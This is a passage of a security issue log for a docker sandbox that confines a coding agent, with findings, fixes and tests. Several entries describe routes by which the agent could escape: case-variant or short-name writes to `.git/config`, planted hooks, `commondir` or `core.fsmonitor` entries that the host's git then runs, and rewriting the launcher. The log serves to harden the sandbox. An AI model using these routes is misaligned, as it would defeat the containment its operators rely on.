- **Fix:** `_git_kv()` splits an entry at its first newline looking at no more than its first 257 characters, with no regex and no locale switch: the review of the fix measured a bounded regex at 2 ms a call, compiled every time, and 5000 planted keys took a launch from 2 s to 15 s; the binding pass, which wants only `core.hooksPath`, tests a fixed prefix instead. A key over 256 characters, which no key the launcher acts on needs, is not split: the include walk is cut there with its `WARNING:` (an include it would have followed is not), and `_git_exec_keys()` names it once as `(a key of more than 256 characters)` rather than printing it.
- **Tests:** `tests/test-git-internals-ro-config.sh` G135: the split itself (an entry, a key with no value, a 64 KB key refused at once), and a launch with three 64 KB `includeIf` conditions that is cut, says so, names the key by its size and stays within 10 s; seen failing first (the launch was refused at 11 s). And 5000 `include.path` entries (G38's shape) launch as fast as before.

### GIT-48: a `config`, `hooks/`, `commondir` or `config.worktree` that cannot be made is only warned about, or not at all
- **Status: FIXED** (2026-11-08). Found by the final review of the GIT-45 fix. `sandbox.sh: _git_cant_make()`, called where `launcher_ro_overlay()` makes each of them and `config`, refuses the launch where the agent could write the git directory (`_agent_could_write()`: yours, or the agent's by its uid, group or an ACL) and the file or directory cannot be made, naming the `chmod u+w` that undoes it (or mounting the repository `:ro` on a read-only filesystem); one that appeared meanwhile is left to the checks that judge what is there. Any other git directory, which the agent cannot write either, gets the `WARNING:`, a missing `config.worktree` and `config` now too, once. The review of the fix found the placeholders made only where `objects/` exists, which the agent decides: moved aside, or never made (an empty `.git`), the git directory had nothing made or bound, and with `objects/` back, or a repository made there, in the next session, the host's git ran a hook the agent wrote (reproduced). So a `.git`, and a git directory under `.git/modules`, get them whatever they hold; a linked worktree's, which names its common one, does not, unless it has no `commondir`: the second review found one with its `commondir` removed got nothing either, and the agent wrote it back in the next session with a `config.worktree` whose `core.fsmonitor` the host's git ran (reproduced, with `extensions.worktreeConfig` on). Git never leaves one without, so a `./` placeholder there is inert. A worktree's directory is one in a directory named `worktrees`, never a `.git`, so a repository kept under a directory of that name is not taken for one; and one with a `commondir` of its own, under `.git/modules` too, is still left out, so one repaired after it got placeholders launches (third review: it was refused for its `../..`). Accepted: a bare repository's linked worktree with no `commondir` is not protected, but not silently: its checkout's `.git` file is named as leading to no git directory. The bind loop's warning that one could not be made fires only where the launch tried to make it, not for a submodule's linked worktree, which has no `hooks/` by design. Accepted: the scan takes any directory under `.git/modules` holding `refs/`, `config`, `hooks/`, `index` or `commondir` for a git directory, so one that is not (git-svn's `svn/`) gets the placeholders too, inert to git, at the cost of a few bind mounts. The refusal's advice follows who owns the directory, as `_unlistable_hint()`'s does. Tests: `tests/test-git-internals-ro-config.sh` G133: each of the four in a read-only `.git` of yours, each refusal named to its comma so another's cannot pass for it; a read-only `.git` with `objects/` moved aside; a `.git` with `objects/` moved aside and an empty `.git` getting them bound; a linked worktree's with no `commondir` getting one bound; a submodule's linked worktree drawing no warning, and launching again once repaired; a repository under a directory named `worktrees` still protected; a read-only `.git` that holds them all still launching; and, with a stand-in for `_agent_could_write`, that the agent's own uid and gid decide. Each seen failing first. Mutation 467 refreshed for the new line.
- **Severity: LOW.** Confidence: CONFIRMED (measured: with `.git` at `a-w`, a missing `config.worktree` where the extension is on gave rc 0, no mount, no message).
- **Location:** `sandbox.sh: launcher_ro_overlay()`, where `config`, `hooks/`, the `./` commondir and the `config.worktree` placeholder are made, and where it decides which git directories get them.
- **What's wrong:** the agent, running as you, owns `.git` (a writable pin) and can make it read-only in one session. At the next launch the launcher cannot make the file or directory, so nothing is bound there: `hooks/` and `commondir` get a `WARNING:`, a missing `config.worktree` nothing. The agent makes `.git` writable again in that session and writes a hook, a `commondir`, or a `core.fsmonitor` in `config.worktree`. `config.worktree` needs the extension turned on after the agent made `.git` read-only, so the window is narrow; `hooks/` only matters where a repository lacks one.
- **Fix direction:** refuse the launch where the git directory is yours and the file or directory cannot be made, as `_git_push_hooks()` does for the push hooks' directory (GIT-45), with the `chmod u+w` that undoes it.

### GIT-43: a second name on a filesystem mounted inside a writable mount is not looked for
- **Status: FIXED** (2026-11-08). `_fs_linked_in()` also lists, on its own, each filesystem mounted inside a writable mount that is on the file's device and whose parent directory is not; one whose parent is on it is in a listing already, since `-xdev` enters it. The mount points come from `/proc/self/mountinfo` (`_win_mounts()`), or from `mount(8)` where there is none, as on macOS (`_fs_mounts_in()`). Tests: G131 in `tests/test-git-internals-ro-reads.sh` binds a directory of TMPDIR's filesystem inside a tmpfs in a user namespace, where a file outside has its second name, and was seen failing first; it also checks the parse of `mount(8)`'s table. The mount points below each writable mount are found once a launch, and one that cannot be stat'ed rules nothing out (the review of the fix: matched again for every file asked about, planted links to thousands of linked files took a launch minutes; and one under a directory the agent made unsearchable was dropped). Measured on macOS 26.7.2 (2026-11-08): `mount` names a mount point by the physical path `pwd -P` gives, `/Users/…` and not the firmlinked `/System/Volumes/Data/Users/…`, and `/private/var/…` for a TMPDIR reached through `/var`, so the prefix match holds. A disk image attached (`hdiutil attach -mountpoint`) inside a writable mount, a file on it with a second name there: found (0), and not ruled out (2) once a directory above the mount point is `chmod 000`. G131 runs that on macOS with a real image, and goes red when `_fs_mounts_in()` stops reading `mount(8)`. Was: OPEN (2026-11-07). Found by the review of the GIT-39 fix, and raised again by the automated security review of `f90c096`, which rated it MEDIUM.
- **Severity: LOW.** Confidence: CONFIRMED, in a user namespace. It needs a host-side mount nested inside a writable mount, on the file's device, when the writable mount's own root is on another device: say `/home` on its own partition, and a directory of the root filesystem bound into a project there. A bind of the same filesystem keeps its `st_dev`, and `-xdev` enters it.
- **Location:** `sandbox.sh: _fs_linked_in()`, which lists only the writable mounts whose root is on the file's device, each with `find -xdev`. `_fs_other_names()`, the hard-link refusal, goes through it too.
- **What's wrong:** docker's binds are recursive, so a filesystem mounted inside a writable mount is writable by the agent too. A second name of an included file, a hook, or a file a launcher link leads to, on such a filesystem, is not seen: the launch is silent, or not refused.
- **Fix direction:** find the mount points below each writable mount (`/proc/self/mountinfo` on Linux, `mount` on macOS), and list a writable mount whose root or any mount below it is on the file's device, without `-xdev`. Or, cheaper: when a writable mount holds a mount point on the file's device, answer "not ruled out".

### GIT-41: on Docker Desktop, a read-only bind of one file does not cover its other spellings
- **Status: FIXED on WSL, MITIGATED on macOS** (2026-11-07): refused on WSL's drvfs, put back when the container exits on macOS. Found by the review of the GIT-38 fix.
- **Severity: HIGH** where it applies: Docker Desktop on macOS and on Windows, whose containers reach a host directory through virtiofs or 9p. Confidence: CONFIRMED on WSL's drvfs with Docker Desktop and on macOS with Colima's virtiofs (platform-issues PLAT-8), and on WSL's drvfs with a native Docker Engine in the distro, where the launch is refused too (PLAT-9, 2026-11-08); Docker Desktop on macOS is unmeasured.
- **Measured on WSL** (Docker Desktop 29.9.2, a drvfs directory that ignores case), and wider than the model:
  - `.git/CONFIG` wrote the host's `.git/config`.
  - Directory binds did not hold either. `.git/HOOKS/post-commit` was written past the read-only `hooks/`, `.GIT/config` past a read-only bind of the whole `.git`, and `sandbox.sh` through `.AI-CONTAINERS` past the launcher overlay: the agent could rewrite what the host runs at the next launch.
  - A pinned directory was renamed through another spelling.
  - drvfs makes a dentry per spelling, and a bind is a mount on one dentry, so no arrangement of binds closes this there.
  - In a case-sensitive directory every other spelling was a name of its own. But Windows also answers to a name's 8.3 short name, on a drive that makes them (C: by default; `NtfsDisable8dot3NameCreation` 2, per volume), and it does so in a case-sensitive directory too. There `AI-CON~1/sandbox-common.sh` was written past a read-only bind of `.ai-containers` (automated security review of `1ed3de8`, measured). D: here makes none, but nothing on Linux lists short names.
- **Fix (WSL):** after the overlay pass, every overlay, pin and file bind is checked along its way below the writable mount root it lies in (`launcher_ro_overlay()`). One reachable by another name refuses the launch, naming the directory and the remedies: the distro's own filesystem, or `:ro`.
  - Wherever Windows looks the names up, or NTFS holds them, any name counts (`_win_fs()`, from `/proc/self/mountinfo`): drvfs over `9p` with `aname=drvfs`, measured; not measured, virtiofs on a WSL kernel (WSL can serve drvfs over it), SMB by the protocol (`cifs`, `smb3`, `fuse.smbnetfs`, `fuse.gvfsd-fuse`), and `ntfs3` and `ntfs-3g` (`fuseblk`), whose directories index the short names (automated security review of `0e0ea9a`). Other types are not refused: an NFS home would be. A case-sensitive directory does not exempt it. The first version did, until the review measured the short names.
  - Elsewhere, a directory that ignores case (`_ci_name()`) on a filesystem whose kernel does not.
  - `_ci_alias_fs()` says which filesystems those are: on Linux, any type but ext4, f2fs and tmpfs, whose kernels casefold themselves, so a name there has one dentry and binds held (the model). A type that cannot be read counts as such a filesystem.
  - Not applied on macOS.
  - A name is turned over in case under a UTF-8 locale when the launcher's own leaves it as it is (`_case_flip()`, for `_ci_path()` too): under `LC_ALL=C`, `Док` was never seen to ignore case. Where no UTF-8 locale exists, a `WARNING:` says such names were not tried.
  - Spelling (GIT-38 on drvfs): `_ds_readdir()` globs in a UTF-8 locale, and a directory whose listing names nothing that is the name refuses the launch. Before, the path was kept as given, which is the spelling the agent chose. On a Windows filesystem every name is spelled so (`_win_path()`), case-sensitive directory or not: a `gitdir:` or mount written with a short name (`LONGNA~1`) was compared as written, outside the mount it lies in (review of `0e0ea9a`).
  - Tests: G121 to G123 in `tests/test-git-internals-ro-casefold.sh`, and T62, T63 and T71 in `tests/test-launcher-dir-ro.sh`. G123, a path through a short name refused, runs only on a drive that makes them (C: here). Where `TMPDIR` is on such a filesystem, a launcher overlay and a `.git` in a writable mount refuse, a read-only mount does not, and a project in a case-sensitive directory refuses as well. A path reached in another case, a name with no ASCII letter under `C` too, is spelled as on disk. T62, everywhere: a directory readdir must spell and cannot list refuses. Each part was demonstrated red by a mutant: `_win_fs()` false, the mountinfo match broken, the UTF-8 flip and the UTF-8 glob removed, the fail-closed return, and the listing of every name on a Windows filesystem (its gate and its use). The added types are a list, not demonstrated: no such mount here.
- **Measured on macOS** 26.7.2, Colima 0.10.3 (VZ, virtiofs), Docker 29.5.2, at `15682eb`, through `sandbox.sh` itself (a temporary integration case, then a real `./sandbox.sh open ..`). From the container, writes to `.git/config`, `.GIT/config`, `.git/hooks/pre-commit` and `.git/HOOKS/pre-commit` were refused. Writes to `.git/CONFIG`, `.git/Config.Worktree`, `.git/COMMONDIR` and a linked worktree's `.GIT` went through. The host's `commondir` became `../planted`, and its `config` gained the `core.fsmonitor`. Directory binds hold because a directory has one dentry in the guest, so `HOOKS` resolves to the mounted `hooks`; a file can have several. Docker Desktop was not available to measure.
- **Fix (macOS):** `sandbox.sh: _ro_files_snapshot()` keeps, at launch, each file in `launcher_ro_files` whose own name ignores case on the host. `_ro_files_restore()` runs when `docker run` returns. It puts back any of them that changed, was removed, or became a link or a FIFO. The file is restored by an exclusive create under a random name, its mode from the umask, and a rename that does not follow a link at the destination. What stood there is copied, never moved, into `~/.ai-containers/restored/<time>-<pid>/`, which a `WARNING:` names with the `diff` to compare. A first version renamed it aside beside the file, to a predictable name in a directory a sibling container can write; a link planted at that name to `~/.ssh` would have moved the planted config there as `~/.ssh/config` (automated security review of the fix; HIGH). Where names are case-sensitive nothing is kept: the container cannot reach the file there, so a change was the host's own (`git push -u`), and putting it back would undo it.
- **Not covered (macOS):** the host's git reads the changed file until the container exits, so an IDE that runs `git status` meanwhile runs a planted `core.fsmonitor`. A launcher killed before `docker run` returns puts nothing back. A file over 1 MiB is named and not kept. The alternatives were a read-only `.git` with writable subdirectories, which breaks commits (git makes `index.lock` and `HEAD.lock` in `.git` itself), and refusing such hosts, which is every Mac.
- **Tests (macOS):** G127 in `tests/test-git-internals-ro-casefold.sh` (written, changed, removed, linked, FIFO, `COMMONDIR`, a worktree's `.GIT`, no change) and in `tests/test-git-internals-ro-reports.sh` (case-sensitive: a host change is kept). Seen failing before the fix, and against a mutant that drops the case test. End to end on Colima: the agent's write landed, and the launcher put `config` back on exit.
- **Location:** `sandbox.sh: launcher_ro_overlay()`, which binds `config`, `config.worktree`, `commondir` and each `.git` file read-only one file at a time.
- **What's wrong:** the guest kernel compares names case-sensitively, so `.git/CONFIG` is a name of its own, not a mount point. The host server opens it case-insensitively, which is the same file as `config`.
  - In the model: a write to `.git/config` was refused, while a write to `.git/CONFIG` went through and put a `core.fsmonitor` into the host's config.
  - Directory binds held: `.git/HOOKS/post-commit` and `hooks/POST-COMMIT` were refused.
  - On a native casefold filesystem, every spelling was refused.
- **Fix direction:** measure it first: from a restricted container on Docker Desktop, write `.git/CONFIG` and read the host's `.git/config`. If it goes through, a single file cannot be made read-only there by its name. That would mean binding a directory that holds it (a read-only `.git` with writable `objects/`, `refs/`, `logs/` and the index binds inside it), or refusing such hosts.

### GIT-40: a commondir under a read-only overlay that leads nowhere keeps the decoy config
- **Status: FIXED** (2026-11-06). Found by the automated security review of `a1b7ce7`, the GIT-36/37 fix.
- **Severity: MEDIUM.** Confidence: CONFIRMED (G116: launched without judging `config.worktree` before the fix; with a commondir outside every mount, in silence).
- **Location:** sandbox.sh: `launcher_ro_overlay()`, the branch for a git directory under a read-only overlay, which records the config its post-pass reads `extensions.worktreeConfig` from.
- **What was wrong:** the commondir under a read-only overlay was handled in two cases.
  - One that resolved: its common directory's config was used.
  - One that did not resolve: the git directory's own `config` was kept. git never reads that config for a worktree, and the agent could plant a decoy there saying `worktreeConfig = false`.
  - So a `config.worktree` beside it, including a file the agent writes, was never judged.
  - git refuses the git directory while its common directory is missing, and reads that directory's config once it exists, never the decoy. One inside a writable mount was already named (`_gd_resolve()`: "does not exist"); one outside every mount, an absolute path made later on the host, was not, and the launch was silent.
  - The protected path already failed closed here (security review of `99db199`).
- **Fix:** such a commondir names `/nonexistent/ai-launcher-unresolved-commondir/config`, as the protected path does. What cannot be read cannot say the extension is off, so `config.worktree` is walked. An empty commondir is this directory, to git and to `_cd_phys()` alike, so its own config is read, as on the protected path.
- **The review of the fix** found the test passed with the usual common directory's config read in place of the sentinel (the agent can set that config too), and that the first version took an empty commondir for one that does not resolve. Both fixed: the test sets that config's extension off and covers a commondir outside every mount, and an empty commondir is pinned by its own config's `core.hooksPath` being judged.

## 26. Found while doing GAP-2's slice 3

Found 2026-11-08, at `7d959f8`, while killing the slice's survivors, and in its CI run. GIT-47 was found by the final review of the slice's commit, `dd670cb`.

### LNCH-22: a host path holding ':', or bytes that are not UTF-8, cannot be mounted
- **Status: FIXED** (2026-11-08, after `8e2ab13`). Every bind of the launch goes through `_bind_add()`: `_bind_mount_arg()`'s form (`--mount` for a name holding `:`), and a refusal, naming it, before docker runs, for one `_mount_representable()` rejects (not UTF-8; a `:` with trailing whitespace or a CR) or a `:` name whose mode is more than `ro`/`rw`. `launcher_ro_overlay()` and `repos_path_in_container()` read a bind back with `_bind_read()`, the `--mount` form as a CSV record. An `EXTRA_MOUNTS` entry's trailing `:<options>` is its mode only when every option is one `-v` takes; any other `:` is part of the path. Tests: T67 in `tests/test-launcher-dir-ro.sh` (every kind of bind holding `:`: the primary, `EXTRA_MOUNTS`, a `REPOS` bind, the four pointers, a launch directory, and a `HOME` for the group's mounts and the verify directory; a read-only one; a name holding `,` and `"`; and the refusals, each naming the name at fault), case 8 in `tests/test-repos-path.sh`, and the integration shim's wait on a verify directory passed as `--mount` (`tests/test-integration-shim.sh`), each seen failing first, except `:ro,z` passed through to `-v`, a guard of behaviour that did not change; T64's second variant now uses a launcher named `c:o ` with the primary inside it, and still kills slice 3's `<home>` mutants. Measured with docker 29 on Linux: `--mount` with a `:` in both source and destination, read-only included, a record holding `,` and a doubled `"`, and a `-w` holding all three. Not changed: `repo.sh`'s seed containers and `extract-discovery.sh` (LNCH-23).
- **Checked on Docker Desktop** (2026-11-08, WSL agent, at `042edd0`): Docker Desktop 4.97.0 (engine 29.9.2) on WSL2, ext4. A temporary integration case launched `sandbox.sh open` through `launcher_up` with a primary `p:rim` holding a git repository and `EXTRA_MOUNTS` naming `ex:tra:ro`: the primary was mounted at `/workspace/p:rim` and writable to the host, its `.git/config` read-only, and `ex:tra` mounted read-only, 5/5. The same case at `8e2ab13`, before the fix, failed: `EXTRA_MOUNTS path does not exist: …/ex`, and with the primary alone, Docker Desktop's own `docker: invalid spec: …p:rim:/workspace/p:rim:rw: too many colons`, exit 125 (Linux's message is `invalid mode`). The case was not kept. A name that is not UTF-8 is refused before docker runs, so no engine is involved there.
- **Was: OPEN** (2026-11-08).
- **Severity: LOW.** Confidence: CONFIRMED with docker 29 on Linux. A `:`: `invalid mode: /workspace/.agent-blocked`, exit 125, and the launch fails. A name that is not UTF-8: the CLI rewrites it to U+FFFD, and the daemon mounts the directory of that name beside it, making it empty and root-owned where there is none (measured by the second review of GAP-2's slice 3). Where one exists, made through an earlier writable mount of the parent say, docker mounts it writable, unscanned (measured by the final review): no launcher in it is overlaid and no git directory in it protected.
- **Location:** `sandbox.sh: run_container()`, every `-v` it builds: the primary, `EXTRA_MOUNTS`, a `REPOS` bind, the four pointers and the output directories; and `launcher_ro_overlay()`, which reads the mount list back by splitting each `-v` at its first `:`.
- **What's wrong:** docker splits a `-v` value at every `:`, so a source path holding one (a launch directory or a primary named `a:b`) makes too many fields, and docker refuses the whole launch. The launcher overlays and pins already go through `_bind_mount_arg()`, which hands such a name to `--mount`, CSV-quoted. The scan takes the part before the first `:` for the source: one that does not exist is skipped, one that does (`/x/a` beside `/x/a:b`) is searched in its place. Harmless only because docker then refuses the launch.
- **The second form:** the scan examines the directory named, and docker mounts another. The overlays already refuse such a name (`_mount_representable()`); the primary, `EXTRA_MOUNTS` and the four pointers do not.
- **Fix direction:** route every bind through `_bind_mount_arg()` and have `launcher_ro_overlay()` read `--mount` values too; refuse a name that is not UTF-8 before docker, naming it, as the overlays are.

### LNCH-23: `repo.sh` and `extract-discovery.sh` hand docker a host path with `-v` as it is
- **Status: FIXED** (2026-11-08). `_bind_mount_arg()`, `_mount_representable()` and `_utf8_valid()` moved to `sandbox-common.sh`, which every entry point sources, and `docker_bind()` there hands each host path below over in the form docker carries intact (`--mount` for a name holding `:`), or refuses it, naming it, before the container runs (`repo.sh`, `extract-discovery.sh`), skips the migration with its `WARNING:` (the rvm one), or fails the phase (`verify-on-host.sh`). Also: the launch's verify directory is made under the physical `~/.ai-containers`, as the group's mounts are, so a `$HOME` that is not UTF-8 with `~/.ai-containers` a link to one that is no longer refuses the launch at that bind (final review of the LNCH-22 fix). A refused seed is refused before its volume is made (`repo.sh: seed_binds_check()`), and so is a path source that has gone, so neither leaves an empty volume behind; `~/.ssh` is bound only where it exists (`-v` made a missing one, root-owned, and `--mount` refuses one) (reviews of the fix). Tests: `tests/test-host-binds.sh` (`repo.sh add` and `sync` of a path holding `:`; one that is not UTF-8, at `add` and at a `sync` that re-seeds, with no volume made; a git seed's and the git helper's `~/.ssh` under a `HOME` holding `:`), and a case each in `tests/test-extract-discovery.sh` (one holding `:` and one refused), `tests/test-rvm-volume.sh`, `tests/test-verify-exit-code.sh` and `tests/test-launcher-dir-ro.sh` (T67), each seen failing first. Mutations 457 to 459 now patch `sandbox-common.sh`. Was: OPEN (2026-11-08, at `3b98ecd`). Found while fixing LNCH-22.
- **Severity: LOW.** Confidence: CONFIRMED, by the tests the fix added (each failing before it) and LNCH-22's measurements of docker 29.
- **Location:** every other `docker run` that hands docker a host path with `-v`:
  - `repo.sh`: `seed_from_path()` and `sync_from_path()` (`-v "$real":/src:ro`), `seed_from_git()` and `git_helper_run()` (`-v "$HOME/.ssh":/root/.ssh-host:ro`), and `git_helper_run()`'s `repo-git-reset.sh` mount;
  - `extract-discovery.sh`: `-v "$capture_dir:/workspace/.agent-discovery"`;
  - `sandbox-common.sh: rvm_volume_ensure()`, run by the launch: `-v "$legacy:/src:ro"`. With a `$HOME` holding `:` the launch now works, but this one-time migration of a bind-mounted `~/.rvm` fails with a `WARNING:`, and the group starts with an empty Ruby home;
  - `verify-on-host.sh`'s floor container: `-v "$REPO_ROOT:/w:ro"`.
- **What's wrong:** a source holding `:` fails at docker (`invalid mode`), so `repo.sh add <path>` of such a directory, a git repo's seed under a `$HOME` holding one, or an extract from a launch directory named with one, cannot run. A source that is not UTF-8 is rewritten by the CLI, and `-v` creates the missing directory of the new name: `repo.sh add` would seed an empty volume and register it, and the extract would read an empty capture directory. Nothing is scanned there, so nothing is left unprotected; the result is only wrong.
- **Fix direction:** build those binds with `_bind_mount_arg()` (sandbox-common.sh would need it, or a copy), and refuse a name `_mount_representable()` rejects, naming it, as the launch now does.


### LNCH-24: a launcher in a read-only mount inside a writable mount stays writable through it
- **Status: FIXED** (2026-11-10, WSL native agent). The launcher pass of `launcher_ro_overlay()` runs `launcher_dirs_in()` over each read-only mount that lies inside a writable one too, and adds each launcher and unlistable directory it finds in the view of each writable mount that holds it (`chave` drops one bound there already), never in the read-only mount's own. T75 in `tests/test-launcher-dir-ro.sh`, seen red first: the launcher is read-only at `/workspace/o75/node_modules/x/.ai-containers`, `x` pinned there, and nothing is bound under `/workspace/docs`; the added entry undone is caught.
- **Was: OPEN** (2026-11-10). Found by the WSL native agent while fixing GIT-56, its twin for git directories.
- **Severity: LOW.** It needs a pointer you mount read-only (`DOCS_PATH`, `ARCHITECTURE_REPO_PATH`, an `EXTRA_MOUNTS` entry with `:ro`) that holds a launcher, inside a writable mount whose scan does not reach it. Confidence: CONFIRMED with the fake docker: `DOCS_PATH=$O/node_modules/x` with `EXTRA_MOUNTS=$O`, `x/.ai-containers` holding `sandbox.sh` and `sandbox-common.sh`, binds nothing at `/workspace/<o>/node_modules/x/.ai-containers`, which is therefore writable; the same launcher at `$O/y`, which `$O`'s scan reaches, is overlaid read-only there.
- **Location:** `sandbox.sh: launcher_ro_overlay()`, whose launcher pass runs `launcher_dirs_in()` over writable mounts only.
- **What's wrong:** a read-only mount is not scanned for launchers, so a launcher the outer writable mount's scan does not reach (under its pruned `node_modules`, or past six levels) is overlaid nowhere, and the agent can rewrite the `sandbox.sh` the host runs next through the outer mount.
- **Fix direction:** as GIT-56's: scan a read-only mount that lies inside a writable one, and overlay what it finds in the writable mount's view only. Never in the read-only view: the directories above a launcher are pinned with `:rw` self-binds, which there would make writable what was mounted read-only.
### REPO-18: a registry line holding a byte that is not UTF-8 reads back empty, and a re-seed copies the current directory
- **Status: FIXED** (2026-11-08). Found while testing the LNCH-23 fix. `repo_registry_lookup()` and the two registry rewrites (`repo_registry_upsert()`, `repo_registry_remove()`, all in `sandbox-common.sh`) read the registry with `grep -a`, as text; and an empty source, however a record came to hold one, is refused rather than resolved to the current directory (`repo.sh: seed_binds_check()`, `seed_from_path()`, `sync_from_path()`).
- **Location:** `sandbox-common.sh: repo_registry_lookup()` and the registry rewrites; `sandbox-common.sh: resolve_path()`, which gives the current directory for an empty path.
- **Severity: MEDIUM.** Confidence: CONFIRMED (reproduced with GNU grep 3.x under C.UTF-8).
- **What was wrong:** GNU grep, in a UTF-8 locale, prints "binary file matches" instead of a matching line holding an encoding error. So a repository registered with a source path that is not UTF-8 — still possible: Linux's default `auto` backend registers a path repo as a bind without seeding it — read back as an empty record. `sync` or `reset` then used `resolve_path ""`, the current directory: it re-seeded a missing volume from it, or mirrored it into an existing one (rsync with deletes), and rewrote the record empty, as a volume, so every later `REPOS=` attach mounted that copy; `repo.sh sync` run from `$HOME` put `$HOME` in a repo volume containers attach. And `grep -v` dropped that line from every rewrite of the registry for another repo (measured with a fake docker).
- **Tests:** `tests/test-host-binds.sh`: a sync that re-seeds such a repo is refused before its volume is made; the line survives an add and a removal of another repo; a record with no source is refused; each seen failing first, in a UTF-8 locale (under `LC_ALL=C` grep takes no line for binary).

### TST-29: two EQUIVALENT mutants of repo-git-reset.sh were scored KILLED in CI, and nothing said what killed them
- **Status: FIXED** (2026-11-10). The cause is bash's `wait "$!"` on a finished process substitution, which fails at random in bash 5.1, 5.2 and 5.3, in `repo-git-reset.sh: nested_in()`; see **Cause** and **Fix** below. A user's `repo.sh reset` could refuse a sound repository the same way.
- **Was: OPEN** (2026-11-08): the cause was not found. The diagnostic that would find it was FIXED.
- **Severity: LOW.** Confidence: CONFIRMED that it happened, on `7d959f8`'s run (`42424960341`, attempt 1): the `repo-git-reset` shard's ratchet failed `--strict` on two ledger entries now KILLED.
- **Location:** `tests/test-repo-git-reset.sh`, the shard's oracle, on a slow runner; and `tests/falsify/run.sh`, which kept no trace of what a kill printed.
- **What happened:** `repo-git-reset.sh:logic-flip:a5150090…` (`update-index … || true` made `&& true`) and the `return-flip` of `volume_head`'s last `return 0` were KILLED. Both change only a status that nothing reads (survivors.txt entry 16), so the oracle failed for some other reason. The same tree's previous run, on the same runner image and git 2.56, had them SURVIVED. This one took 3,685 s against 2,748 s, with three timeouts; rerun on the same tree (attempt 2), it took 3,662 s and both survived again, so slowness alone is not the trigger. Locally the oracle passes under load, and its deadline-bound steps take 0 s against limits of 15 and 20 s.
- **Why it could not be traced:** the oracle's output went with the runner. A kill's record carries only its signal (`exit+failline`), never the line that fired.
- **Fix (the diagnostic):** run.sh writes `NOTE|failline|<identity>|L<line> seq <n>: <first FAIL: line>` after every KILLED mutant that printed one, from the run that decided it. check-ledger's obsolete-amnesty finding quotes each such line for the identity (`(killed by: …)`), so the next occurrence names its assertion in the CI log. The line is quoted from the `FAIL:` the kill test matched, read as bytes, CRs and NULs dropped. Phase 6 of `verify-on-host.sh`, which re-prints the run's notes, leaves these out: about two thousand would bury the rest. Tests, each seen red first: `tests/test-falsify-run.sh` 4b and the `--select-oracles` sequences, `tests/test-falsify-ledger.sh` 4b (with and without `--strict`), and `tests/test-verify-exit-code.sh`.
- **Next:** when the ratchet next reports an EQUIVALENT entry KILLED, the quoted line is the flaky assertion.
- **Two more occurrences, 2026-11-08, both named by the note:** on `042edd0` (#331's merge), `return-flip:06d3d9b2…`, the same `return 0` line, killed at L293, `volume_head`'s, by `with no origin/HEAD, the first existing guess is used (rc=1)`; and on `8478b3e` (run `42498953845`, attempt 1; the rerun passed), `logic-flip:32431e65…`, `inspect`'s guard made `||`, by `a valid owner is applied without complaint (rc=1)`, which is a `reset`. Neither mutant can change what the assertion that fired checks (the first changes a status nothing reads, the second is in `inspect`, which a `reset` never runs), so `inspect` and `reset` themselves exited 1 at random under the shard's load. Common to both is `check_volume()`, whose `find` walks die (`find could not search all of it`) on any error, a file removed during the walk among them, and `reset`'s clone; the note quoted only the `FAIL:` line, not the helper's message the test prints under it. Ten runs of the oracle here, beside a falsify run, passed.
- **Diagnostic extended (2026-11-08):** the note now also quotes the lines the test printed under the `FAIL:` line, up to six non-blank ones, to its next `PASS:`/`FAIL:` line, run-all.sh's own line for it or the next test's header, joined with ` // ` and cut to 600 bytes (`tests/falsify/run.sh: falsify_fail_note()`), so the next occurrence carries the helper's own message. A CR before `FAIL:` still counts as the space before it, as the kill test reads it. Phase 6 of `verify-on-host.sh` reads the notes as bytes, so a note cut inside a character draws no `binary file matches`. `tests/test-falsify-run.sh` 4b, each rule seen red first.
- **Cause (2026-11-10):** the next occurrence, on `86a6290` (run `42715679640`, reported by the WSL agent), carried the helper's message: `return-flip:06d3d9b2…` killed at L293 by `reset after sanitising`, with `repo-git-reset: cannot check …/poisoned: find could not search all of it (an unreadable directory, or a path too long); refusing this repository`. Two finds in `check_volume()` print that message, its parenthesis included, from a command substitution's status, so where it came from is inferred: `nested_in()` read its find's output with `mapfile -d '' … < <(find …)` and the status with `wait "$!"`, and once the substitution has finished that `wait` reports failure now and then under load, the find done and fine (`-1`, or `127` with `wait: pid N is not a child of this shell`). Measured on a `find` over a directory nothing touched, the container held to half a CPU, four loops of 3,000 at once, 36,000 waits each: bash 5.1.16 (ubuntu:22.04, the floor) 3 failed; 5.2.21 (ubuntu:24.04, CI's runner) 6; 5.2.26 (a seed image built before `67dd068`, alpine 3.20) 25; 5.3.9 (today's seed image, alpine:3.24) 12; 5.3.20 7. A background job's `wait`: 0. A version that also wrote find's status into its output saw `wait` fail with the record saying `status 0`. The first measurements here, none failed of 6,000 on 5.1 and on 5.3, were too few for a rate near 1 in 6,000 and are withdrawn. `nested_in()` runs in `inspect` (through `check_volume`'s `list` mode) and in `reset` (`remove_nested`), never in `pull`, which is why every assertion that fired runs one of those two. So `repo.sh reset`, which runs `inspect` for its confirmation and then `reset`, both in the seed image, could refuse a sound repository at random; a second run would normally succeed. `version.sh: _ver_run()` waits on a process substitution too, and fails the same way: GIT-50.
- **Fix:** the find's status comes last in its own output, `status N` NUL-terminated, a record no path it prints can be (each ends in `.git`), and `nested_in()` refuses unless the last record is `status 0`, so a substitution cut short refuses too; no `wait`. The record is then removed from the caller's array, not copied out of it. Tests in `tests/test-repo-git-reset.sh`, the first two seen red with the old code: a `wait` that always fails, set through `BASH_ENV`, leaves `inspect` and `reset` working; a `find` that fails, and a substitution killed before find runs or after it printed a nested repository, refuse the volume. Seven broken versions of the new lines are each caught: the falsify operators' four, a check of the status's word alone, one that takes a missing record as success, and one that keeps the record as a path (`reset` then printed `REMOVED|status 0`). The two ledger entries (survivors.txt entry 16) were right: both mutants change nothing.

### GIT-50: `version.sh: _ver_run()` waits on a process substitution, and that wait fails at random
